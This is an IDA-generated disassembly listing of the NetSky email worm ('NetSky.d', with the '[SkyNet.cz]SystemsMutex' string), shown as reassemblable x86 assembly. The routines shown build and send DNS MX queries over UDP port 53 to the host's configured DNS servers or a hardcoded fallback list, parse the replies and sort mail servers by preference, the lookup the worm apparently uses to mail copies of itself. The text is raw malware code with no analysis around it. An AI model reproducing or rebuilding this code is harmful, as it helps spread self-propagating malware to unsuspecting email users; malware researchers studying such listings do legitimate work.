; [00000012 BYTES. COLLAPSED STRUCT _cpinfo. PRESS KEYPAD "+" TO EXPAND]
; [00000044 BYTES. COLLAPSED STRUCT _STARTUPINFOA. PRESS KEYPAD	"+" TO EXPAND]
; [00000190 BYTES. COLLAPSED STRUCT WSAData. PRESS KEYPAD "+" TO EXPAND]
; [00000008 BYTES. COLLAPSED STRUCT FILETIME. PRESS KEYPAD "+" TO EXPAND]
; [0000013E BYTES. COLLAPSED STRUCT _WIN32_FIND_DATAA. PRESS KEYPAD "+"	TO EXPAND]
; [00000010 BYTES. COLLAPSED STRUCT SYSTEMTIME.	PRESS KEYPAD "+" TO EXPAND]
; [000000AC BYTES. COLLAPSED STRUCT _TIME_ZONE_INFORMATION. PRESS KEYPAD "+" TO	EXPAND]
; [00000010 BYTES. COLLAPSED STRUCT _SYSTEMTIME. PRESS KEYPAD "+" TO EXPAND]
; [00000004 BYTES. COLLAPSED STRUCT in_addr::$D372A6A693AD58C7DF6E24FECE06681F::$033CE9DED08D2165C0975678BDBAA031. PRESS KEYPAD	"+" TO EXPAND]
; [00000004 BYTES. COLLAPSED STRUCT in_addr::$D372A6A693AD58C7DF6E24FECE06681F::$B5B88EE2C732E3825D6862D85B1080CF. PRESS KEYPAD	"+" TO EXPAND]
; [00000004 BYTES. COLLAPSED STRUCT in_addr::$D372A6A693AD58C7DF6E24FECE06681F.	PRESS KEYPAD "+" TO EXPAND]
; [00000004 BYTES. COLLAPSED STRUCT in_addr. PRESS KEYPAD "+" TO EXPAND]
; [00000010 BYTES. COLLAPSED STRUCT sockaddr. PRESS KEYPAD "+" TO EXPAND]

;
; ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
; º	This file is generated by The Interactive Disassembler (IDA)	    º
; º	Copyright (c) 2004 by DataRescue sa/nv,	<ida@datarescue.com>	    º
; ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
;
; File Name   :	NetSky.d
; Format      :	Portable executable for	IBM PC (PE)
; Imagebase   :	400000
; Section 1. (virtual address 00001000)
; Virtual size			: 00005000 (  20480.)
; Section size in file		: 00004800 (  18432.)
; Offset to raw	data for section: 00000400
; Flags	E0000060: Text Data Executable Readable	Writable
; Alignment	: 16 bytes ?
; OS type	  :  MS	Windows
; Application type:  Executable	32bit
;


unicode		macro page,string,zero
		irpc c,<string>
		db '&c', page
		endm
		ifnb <zero>
		dw zero
		endif
endm

		model flat

; ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

; Segment type:	Pure code
; Segment permissions: Read/Write/Execute
A		segment	para public 'CODE' use32
		assume cs:A
		;org 401000h
		assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing

; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_401000	proc near		; CODE XREF: sub_4010A4+FAp

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		mov	eax, [ebp+arg_4]
		push	esi
		push	edi
		mov	edi, [ebp+arg_0]
		xor	edx, edx
		xor	ecx, ecx
		xor	esi, esi
		cmp	byte ptr [edi],	0
		jz	short loc_40103F
		push	ebx
		push	1
		pop	ebx
		sub	ebx, edi
		mov	[ebp+arg_0], ebx

loc_40101F:				; CODE XREF: sub_401000+3Cj
		mov	bl, [edi]
		cmp	bl, 2Eh
		jnz	short loc_401032
		mov	[edx+eax], cl
		mov	edx, [ebp+arg_0]
		xor	ecx, ecx
		add	edx, edi
		jmp	short loc_401037
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_401032:				; CODE XREF: sub_401000+24j
		mov	[esi+eax+1], bl
		inc	ecx

loc_401037:				; CODE XREF: sub_401000+30j
		inc	esi
		inc	edi
		cmp	byte ptr [edi],	0
		jnz	short loc_40101F
		pop	ebx

loc_40103F:				; CODE XREF: sub_401000+14j
		mov	[edx+eax], cl
		and	byte ptr [esi+eax+1], 0
		lea	eax, [esi+1]
		pop	edi
		pop	esi
		pop	ebp
		retn
sub_401000	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_40104E	proc near		; CODE XREF: sub_401335+163p
					; sub_401335+1C0p

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch

		mov	eax, [esp+arg_4]
		push	ebx
		push	esi
		push	edi
		mov	edi, [esp+0Ch+arg_0]

loc_401059:				; CODE XREF: sub_40104E+4Dj
		xor	edx, edx

loc_40105B:				; CODE XREF: sub_40104E+43j
		cmp	edx, 800h
		jge	short loc_40109D
		movzx	ecx, byte ptr [eax]
		test	ecx, ecx
		jz	short loc_40109D
		test	cl, 0C0h
		jnz	short loc_401093
		push	1
		pop	esi
		cmp	ecx, esi
		jl	short loc_401081

loc_401076:				; CODE XREF: sub_40104E+31j
		mov	bl, [esi+eax]
		mov	[edi], bl
		inc	edi
		inc	esi
		cmp	esi, ecx
		jle	short loc_401076

loc_401081:				; CODE XREF: sub_40104E+26j
		cmp	byte ptr [ecx+eax+1], 0
		lea	eax, [ecx+eax+1]
		jz	short loc_401090
		mov	byte ptr [edi],	2Eh
		inc	edi

loc_401090:				; CODE XREF: sub_40104E+3Cj
		inc	edx
		jmp	short loc_40105B
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_401093:				; CODE XREF: sub_40104E+1Fj
		movzx	eax, byte ptr [eax+1]
		add	eax, [esp+0Ch+arg_8]
		jmp	short loc_401059
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_40109D:				; CODE XREF: sub_40104E+13j
					; sub_40104E+1Aj
		and	byte ptr [edi],	0
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_40104E	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_4010A4	proc near		; CODE XREF: sub_40156C+7Cp
					; sub_40156C+A6p ...

buf		= byte ptr -818h
var_814		= word ptr -814h
var_812		= word ptr -812h
var_810		= word ptr -810h
var_80E		= word ptr -80Eh
var_80C		= dword	ptr -80Ch
fromlen		= dword	ptr -18h
from		= sockaddr ptr -14h
optval		= byte ptr -4
arg_0		= dword	ptr  8
name		= dword	ptr  0Ch
s		= dword	ptr  10h
hostshort	= word ptr  14h
arg_10		= dword	ptr  18h

		push	ebp
		mov	ebp, esp
		sub	esp, 818h
		and	[ebp+buf], 0
		push	esi
		push	edi
		mov	ecx, 1FFh
		xor	eax, eax
		lea	edi, [ebp-817h]
		rep stosd
		stosw
		push	10h
		xor	esi, esi
		pop	edx
		stosb
		push	edx		; size_t
		lea	eax, [ebp+from]
		push	esi		; int
		push	eax		; void *
		mov	[ebp+fromlen], edx
		call	_memset
		mov	edi, ds:htons
		add	esp, 0Ch
		cmp	word ptr [ebp+s], si
		mov	[ebp+from.sa_family], 2
		jbe	short loc_4010F5
		push	[ebp+s]
		jmp	short loc_401111
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4010F5:				; CODE XREF: sub_4010A4+4Aj
		push	offset proto	; proto
		push	offset name	; name
		call	ds:getservbyname
		cmp	eax, esi
		jz	short loc_40110F
		mov	ax, [eax+8]
		jmp	short loc_401113
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_40110F:				; CODE XREF: sub_4010A4+63j
		push	35h		; hostshort

loc_401111:				; CODE XREF: sub_4010A4+4Fj
		call	edi ; htons

loc_401113:				; CODE XREF: sub_4010A4+69j
		push	[ebp+name]	; cp
		mov	word ptr [ebp+from.sa_data], ax
		call	ds:inet_addr
		cmp	eax, 0FFFFFFFFh
		mov	dword ptr [ebp+from.sa_data+2],	eax
		jnz	short loc_40113F
		push	[ebp+name]	; name
		call	ds:gethostbyname
		cmp	eax, esi
		jz	short loc_40115A
		mov	eax, [eax+0Ch]
		mov	eax, [eax]
		mov	eax, [eax]
		mov	dword ptr [ebp+from.sa_data+2],	eax

loc_40113F:				; CODE XREF: sub_4010A4+82j
		push	esi		; protocol
		push	2		; type
		push	2		; af
		call	ds:socket
		cmp	eax, 0FFFFFFFFh
		mov	[ebp+s], eax
		jnz	short loc_40115E
		push	0FFFFFFFDh

loc_401154:				; CODE XREF: sub_4010A4+B8j
		pop	eax
		jmp	loc_401264
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_40115A:				; CODE XREF: sub_4010A4+8Fj
		push	0FFFFFFFEh
		jmp	short loc_401154
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_40115E:				; CODE XREF: sub_4010A4+ACj
		push	ebx
		push	11DFh		; hostshort
		call	edi ; htons
		or	byte ptr [ebp-816h], 1
		push	1		; hostshort
		mov	word ptr [ebp+buf], ax
		call	edi ; htons
		mov	[ebp+var_814], ax
		lea	eax, [ebp+var_80C]
		push	eax
		mov	[ebp+var_812], si
		push	[ebp+arg_0]
		mov	[ebp+var_810], si
		mov	[ebp+var_80E], si
		call	sub_401000
		pop	ecx
		mov	esi, eax
		pop	ecx
		add	esi, 0Ch
		push	dword ptr [ebp+hostshort] ; hostshort
		and	[ebp+esi+buf], 0
		inc	esi
		call	edi ; htons
		push	1		; hostshort
		mov	word ptr [ebp+esi+buf],	ax
		call	edi ; htons
		mov	[ebp+esi-816h],	ax
		mov	edi, ds:setsockopt
		lea	eax, [ebp+optval]
		push	4		; optlen
		push	eax		; optval
		mov	ebx, 0FFFFh
		push	1006h		; optname
		push	ebx		; level
		push	[ebp+s]		; s
		mov	dword ptr [ebp+optval],	0FA0h
		call	edi ; setsockopt
		lea	eax, [ebp+optval]
		push	4		; optlen
		push	eax		; optval
		push	1005h		; optname
		push	ebx		; level
		mov	ebx, [ebp+s]
		push	ebx		; s
		call	edi ; setsockopt
		lea	eax, [ebp+from]
		push	10h		; tolen
		push	eax		; to
		add	esi, 5
		push	0		; flags
		lea	eax, [ebp+buf]
		push	esi		; len
		push	eax		; buf
		push	ebx		; s
		call	ds:sendto
		cmp	eax, 0FFFFFFFFh
		jnz	short loc_401225
		push	0FFFFFFFCh

loc_401222:				; CODE XREF: sub_4010A4+1AEj
		pop	esi
		jmp	short loc_40125A
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_401225:				; CODE XREF: sub_4010A4+17Aj
		lea	eax, [ebp+fromlen]
		push	eax		; fromlen
		lea	eax, [ebp+from]
		push	eax		; from
		push	0		; flags
		push	800h		; len
		push	[ebp+arg_10]	; buf
		push	ebx		; s
		call	ds:recvfrom
		cmp	eax, 0FFFFFFFFh
		jnz	short loc_401258
		call	ds:WSAGetLastError
		cmp	eax, 274Ch
		jz	short loc_401254
		push	0FFFFFFFBh
		jmp	short loc_401222
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_401254:				; CODE XREF: sub_4010A4+1AAj
		xor	esi, esi
		jmp	short loc_40125A
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_401258:				; CODE XREF: sub_4010A4+19Dj
		mov	esi, eax

loc_40125A:				; CODE XREF: sub_4010A4+17Fj
					; sub_4010A4+1B2j
		push	ebx		; s
		call	ds:closesocket
		mov	eax, esi
		pop	ebx

loc_401264:				; CODE XREF: sub_4010A4+B1j
		pop	edi
		pop	esi
		leave
		retn
sub_4010A4	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_401268	proc near		; CODE XREF: sub_401335+105p

arg_0		= dword	ptr  8

		push	esi
		mov	esi, [esp+arg_0]
		mov	eax, esi
		push	edi
		imul	eax, 41010h
		push	eax
		call	??2@YAPAXI@Z	; operator new(uint)
		mov	edi, eax
		pop	ecx
		test	edi, edi
		jz	short loc_4012AA
		mov	eax, esi
		imul	eax, 204h
		push	eax		; size_t
		push	0		; int
		push	edi		; void *
		call	_memset
		add	esp, 0Ch
		test	esi, esi
		jle	short loc_4012AA
		mov	eax, edi
		mov	ecx, esi

loc_40129F:				; CODE XREF: sub_401268+40j
		mov	[eax], si
		add	eax, 204h
		dec	ecx
		jnz	short loc_40129F

loc_4012AA:				; CODE XREF: sub_401268+19j
					; sub_401268+31j
		mov	eax, edi
		pop	edi
		pop	esi
		retn
sub_401268	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_4012AF	proc near		; CODE XREF: sub_401335+229p

var_20C		= dword	ptr -20Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 20Ch
		mov	eax, [ebp+arg_0]
		push	ebx
		push	esi
		push	edi
		movzx	eax, word ptr [eax]
		cmp	eax, 2
		jl	short loc_401330
		lea	ecx, [eax-1]
		mov	esi, 204h
		mov	[ebp+var_8], ecx
		jmp	short loc_4012D6
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4012D3:				; CODE XREF: sub_4012AF+7Fj
		mov	ecx, [ebp+var_8]

loc_4012D6:				; CODE XREF: sub_4012AF+22j
		push	1
		test	ecx, ecx
		pop	eax
		jle	short loc_401330
		mov	edx, [ebp+arg_0]
		mov	[ebp+var_4], ecx
		lea	edi, [edx+204h]

loc_4012E9:				; CODE XREF: sub_4012AF+7Bj
		mov	cx, [edi-202h]
		cmp	cx, [edi+2]
		jbe	short loc_401325
		lea	ebx, [edi-204h]
		push	esi
		lea	eax, [ebp+var_20C]
		push	ebx
		push	eax
		call	_memcpy
		push	esi
		push	edi
		push	ebx
		call	_memcpy
		lea	eax, [ebp+var_20C]
		push	esi
		push	eax
		push	edi
		call	_memcpy
		add	esp, 24h
		xor	eax, eax

loc_401325:				; CODE XREF: sub_4012AF+45j
		add	edi, esi
		dec	[ebp+var_4]
		jnz	short loc_4012E9
		test	eax, eax
		jz	short loc_4012D3

loc_401330:				; CODE XREF: sub_4012AF+15j
					; sub_4012AF+2Cj
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_4012AF	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_401335	proc near		; CODE XREF: sub_40156C+119p

var_218		= byte ptr -218h
var_119		= byte ptr -119h
var_118		= byte ptr -118h
var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
in		= in_addr ptr -10h
var_C		= dword	ptr -0Ch
hostshort	= word ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 218h
		and	[ebp+var_118], 0
		push	ebx
		push	esi
		push	edi
		push	3Fh
		xor	eax, eax
		pop	ecx
		lea	edi, [ebp-117h]
		rep stosd
		mov	esi, [ebp+arg_0]
		mov	ebx, ds:ntohs
		stosw
		and	[ebp+var_4], 0
		stosb
		mov	ax, [esi+6]
		push	eax		; netshort
		call	ebx ; ntohs
		movzx	eax, ax
		mov	dword ptr [ebp+hostshort], eax
		mov	ax, [esi+8]
		push	eax		; netshort
		call	ebx ; ntohs
		movzx	edi, ax
		mov	ax, [esi+0Ah]
		push	eax		; netshort
		call	ebx ; ntohs
		movzx	eax, ax
		add	eax, edi
		lea	edi, [ebp+var_118]
		add	eax, dword ptr [ebp+hostshort]
		and	[ebp+var_C], 0
		mov	[ebp+var_18], edi
		mov	[ebp+var_14], eax
		lea	eax, [esi+0Ch]

loc_40139E:				; CODE XREF: sub_401335+78j
					; sub_401335+A7j
		mov	cl, [eax]
		test	cl, cl
		jz	short loc_4013DE
		movsx	ecx, cl
		inc	eax
		mov	dword ptr [ebp+in.S_un], ecx
		test	ecx, ecx
		jz	short loc_40139E
		mov	edx, ecx
		mov	esi, eax
		shr	ecx, 2
		rep movsd
		mov	ecx, edx
		and	ecx, 3
		rep movsb
		mov	edi, [ebp+var_18]
		mov	ecx, edx
		add	[ebp+var_C], ecx
		add	edi, ecx
		mov	esi, [ebp+arg_0]
		add	eax, ecx
		mov	byte ptr [edi],	2Eh
		and	byte ptr [edi+1], 0
		inc	edi
		inc	[ebp+var_C]
		mov	[ebp+var_18], edi
		jmp	short loc_40139E
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4013DE:				; CODE XREF: sub_401335+6Dj
		lea	eax, [ebp+var_118]
		push	eax		; char *
		call	_strlen
		test	eax, eax
		pop	ecx
		jz	short loc_401404
		lea	eax, [ebp+var_118]
		push	eax		; char *
		call	_strlen
		and	[ebp+eax+var_119], 0
		pop	ecx

loc_401404:				; CODE XREF: sub_401335+B8j
		mov	eax, [ebp+var_C]
		lea	edi, [eax+esi+13h]
		mov	ax, [eax+esi+13h]
		push	eax		; netshort
		call	ebx ; ntohs
		cmp	ax, 5
		jnz	short loc_40142B
		dec	dword ptr [ebp+hostshort]
		jz	short loc_40142B
		push	dword ptr [ebp+hostshort] ; hostshort
		call	ds:htons
		mov	[esi+6], ax

loc_40142B:				; CODE XREF: sub_401335+E2j
					; sub_401335+E7j
		mov	ax, [esi+6]
		push	eax		; netshort
		call	ebx ; ntohs
		test	ax, ax
		jz	short loc_401447
		push	dword ptr [ebp+hostshort]
		call	sub_401268
		test	eax, eax
		pop	ecx
		mov	[ebp+arg_0], eax
		jnz	short loc_40144E

loc_401447:				; CODE XREF: sub_401335+100j
		xor	eax, eax
		jmp	loc_401567
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_40144E:				; CODE XREF: sub_401335+110j
		cmp	[ebp+var_14], 0
		jz	loc_40155B

loc_401458:				; CODE XREF: sub_401335+21Dj
		and	[ebp+var_218], 0
		mov	ax, [edi]
		push	eax		; netshort
		call	ebx ; ntohs
		movzx	eax, ax
		dec	eax
		jz	loc_4014FF
		dec	eax
		jz	loc_40153C
		sub	eax, 3
		jz	short loc_4014E9
		sub	eax, 0Ah
		jz	short loc_40148C
		mov	[ebp+var_14], 1
		jmp	loc_40153C
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_40148C:				; CODE XREF: sub_401335+149j
		lea	eax, [edi+0Ch]
		push	esi
		push	eax
		lea	eax, [ebp+var_218]
		push	eax
		call	sub_40104E
		add	esp, 0Ch
		cmp	dword ptr [ebp+hostshort], 0
		jz	loc_40153C
		mov	eax, [ebp+var_4]
		mov	ecx, [ebp+arg_0]
		imul	eax, 204h
		add	eax, ecx
		lea	ecx, [ebp+var_218]
		mov	dword ptr [ebp+in.S_un], eax
		add	eax, 4
		push	ecx		; char *
		push	eax		; char *
		call	_strcpy
		mov	ax, [edi+0Ah]
		pop	ecx
		pop	ecx
		push	eax		; netshort
		call	ebx ; ntohs
		mov	ecx, dword ptr [ebp+in.S_un]
		inc	[ebp+var_4]
		dec	dword ptr [ebp+hostshort]
		mov	[ecx+2], ax
		jnz	short loc_40153C
		and	[ebp+var_4], 0
		jmp	short loc_40153C
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4014E9:				; CODE XREF: sub_401335+144j
		lea	eax, [edi+0Ah]
		push	esi
		push	eax
		lea	eax, [ebp+var_118]
		push	eax
		call	sub_40104E
		add	esp, 0Ch
		jmp	short loc_40153C
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4014FF:				; CODE XREF: sub_401335+134j
		mov	eax, [edi+0Ah]
		mov	dword ptr [ebp+in.S_un], eax
		mov	ax, [esi+6]
		push	eax		; netshort
		call	ebx ; ntohs
		movzx	eax, ax
		cmp	[ebp+var_4], eax
		jge	short loc_40153C
		push	dword ptr [ebp+in.S_un]	; in
		call	ds:inet_ntoa
		push	eax		; char *
		mov	eax, [ebp+var_4]
		imul	eax, 204h
		mov	ecx, [ebp+arg_0]
		lea	eax, [eax+ecx+104h]
		push	eax		; char *
		call	_strcpy
		inc	[ebp+var_4]
		pop	ecx
		pop	ecx

loc_40153C:				; CODE XREF: sub_401335+13Bj
					; sub_401335+152j ...
		dec	[ebp+var_14]
		jz	short loc_40155B
		mov	ax, [edi+8]
		push	eax		; netshort
		call	ebx ; ntohs
		movzx	eax, ax
		lea	edi, [eax+edi+0Ch]

loc_40154F:				; CODE XREF: sub_401335+224j
		cmp	byte ptr [edi],	0
		jz	loc_401458
		inc	edi
		jmp	short loc_40154F
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_40155B:				; CODE XREF: sub_401335+11Dj
					; sub_401335+20Aj
		push	[ebp+arg_0]
		call	sub_4012AF
		mov	eax, [ebp+arg_0]
		pop	ecx

loc_401567:				; CODE XREF: sub_401335+114j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_401335	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_40156C	proc near		; CODE XREF: sub_4019FF+5Bp

var_808		= dword	ptr -808h
dwBytes		= dword	ptr -8
var_4		= dword	ptr -4
hMem		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 808h
		and	byte ptr [ebp+var_808],	0
		push	ebx
		push	esi
		push	edi
		mov	ecx, 1FFh
		xor	eax, eax
		lea	edi, [ebp+var_808+1]
		mov	esi, 248h
		rep stosd
		stosw
		stosb
		mov	edi, ds:GlobalAlloc
		push	esi		; dwBytes
		push	40h		; uFlags
		call	edi ; GlobalAlloc
		mov	ebx, eax
		lea	eax, [ebp+dwBytes]
		push	eax
		push	ebx
		mov	[ebp+dwBytes], esi
		call	GetNetworkParams
		cmp	eax, 6Fh
		jnz	short loc_4015C5
		push	ebx		; hMem
		call	ds:GlobalFree
		push	[ebp+dwBytes]	; dwBytes
		push	40h		; uFlags
		call	edi ; GlobalAlloc
		mov	ebx, eax

loc_4015C5:				; CODE XREF: sub_40156C+47j
		lea	eax, [ebp+dwBytes]
		push	eax
		push	ebx
		call	GetNetworkParams
		test	eax, eax
		jnz	short loc_401624
		lea	eax, [ebp+var_808]
		push	eax
		push	0Fh
		lea	eax, [ebx+110h]
		push	35h
		push	eax
		push	[ebp+hMem]
		call	sub_4010A4
		mov	edi, eax
		add	esp, 14h
		test	edi, edi
		jnz	short loc_40165E
		mov	esi, [ebx+10Ch]

loc_4015FC:				; CODE XREF: sub_40156C+B6j
		test	esi, esi
		jz	short loc_401627
		lea	eax, [ebp+var_808]
		push	eax
		push	0Fh
		lea	eax, [esi+4]
		push	35h
		push	eax
		push	[ebp+hMem]
		call	sub_4010A4
		mov	edi, eax
		add	esp, 14h
		test	edi, edi
		jnz	short loc_401661
		mov	esi, [esi]
		jmp	short loc_4015FC
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_401624:				; CODE XREF: sub_40156C+65j
		mov	esi, [ebp+hMem]

loc_401627:				; CODE XREF: sub_40156C+92j
		mov	[ebp+var_4], offset off_407030

loc_40162E:				; CODE XREF: sub_40156C+EEj
		lea	eax, [ebp+var_808]
		push	eax
		mov	eax, [ebp+var_4]
		push	0Fh
		push	35h
		push	dword ptr [eax]
		push	[ebp+hMem]
		call	sub_4010A4
		mov	edi, eax
		add	esp, 14h
		test	edi, edi
		jnz	short loc_401661
		add	[ebp+var_4], 4
		cmp	[ebp+var_4], offset aSkynet_czSyste ; "[SkyNet.cz]SystemsMutex"
		jl	short loc_40162E
		jmp	short loc_401661
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_40165E:				; CODE XREF: sub_40156C+88j
		mov	esi, [ebp+hMem]

